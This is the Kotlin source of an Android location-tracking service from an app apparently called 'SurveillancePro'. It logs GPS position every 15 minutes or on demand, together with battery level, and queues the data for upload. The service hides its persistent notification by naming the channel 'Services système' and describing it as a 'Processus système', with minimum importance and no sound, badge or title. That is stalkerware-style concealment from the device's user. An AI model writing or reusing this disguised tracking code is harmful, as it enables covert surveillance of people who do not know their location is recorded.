package com.surveillancepro.android.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.os.Looper
import android.util.Log
import com.google.android.gms.location.*
import com.surveillancepro.android.MainActivity
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Service GPS dual-mode:
 * - MODE_CONTINUOUS: tracking périodique (toutes les 15 min par défaut)
 * - MODE_SINGLE: une seule localisation à la demande puis arrêt
 */
class LocationService : Service() {

    private lateinit var fusedClient: FusedLocationProviderClient
    private var locationCallback: LocationCallback? = null
    private var mode = MODE_CONTINUOUS

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        fusedClient = LocationServices.getFusedLocationProviderClient(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        mode = intent?.getStringExtra(EXTRA_MODE) ?: MODE_CONTINUOUS

        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        val notification = Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)

        if (mode == MODE_SINGLE) {
            fetchSingleLocation()
        } else {
            startPeriodicTracking()
        }

        return START_STICKY
    }

    private fun startPeriodicTracking() {
        stopCurrentTracking()

        val request = LocationRequest.Builder(
            Priority.PRIORITY_BALANCED_POWER_ACCURACY,
            PERIODIC_INTERVAL_MS
        )
            .setMinUpdateIntervalMillis(MIN_INTERVAL_MS)
            .setMinUpdateDistanceMeters(50f)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                val location = result.lastLocation ?: return
                enqueueLocation(
                    location.latitude, location.longitude,
                    location.accuracy.toDouble(), "periodic"
                )
            }
        }

        try {
            fusedClient.requestLocationUpdates(request, locationCallback!!, Looper.getMainLooper())
            Log.d(TAG, "Periodic tracking started (${PERIODIC_INTERVAL_MS / 60000}min)")
        } catch (e: SecurityException) {
            Log.w(TAG, "Location permission denied")
            stopSelf()
        }
    }

    private fun fetchSingleLocation() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 1000L)
            .setMaxUpdates(1)
            .setDurationMillis(30000)
            .build()

        val callback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                val location = result.lastLocation ?: return
                fusedClient.removeLocationUpdates(this)
                enqueueLocation(
                    location.latitude, location.longitude,
                    location.accuracy.toDouble(), "on_demand"
                )
                stopSelf()
            }
        }

        try {
            fusedClient.requestLocationUpdates(request, callback, Looper.getMainLooper())
        } catch (_: SecurityException) {
            stopSelf()
        }
    }

    private fun enqueueLocation(lat: Double, lng: Double, accuracy: Double, source: String) {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("location", mapOf(
            "latitude" to lat,
            "longitude" to lng,
            "accuracy" to accuracy,
            "batteryLevel" to getBatteryLevel(),
            "source" to source,
            "timestamp" to timestamp,
        ))
    }

    private fun getBatteryLevel(): Int {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun stopCurrentTracking() {
        locationCallback?.let {
            try { fusedClient.removeLocationUpdates(it) } catch (_: Exception) {}
        }
        locationCallback = null
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Services système",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Processus système"
            setShowBadge(false)
            setSound(null, null)
            enableLights(false)
            enableVibration(false)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    override fun onDestroy() {
        stopCurrentTracking()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        const val CHANNEL_ID = "supervision_pro_service"
        const val NOTIFICATION_ID = 1001
        const val EXTRA_MODE = "location_mode"
        const val MODE_CONTINUOUS = "continuous"
        const val MODE_SINGLE = "single"
        private const val TAG = "LocationService"
        private const val PERIODIC_INTERVAL_MS = 15 * 60 * 1000L // 15 minutes
        private const val MIN_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes minimum
    }
}
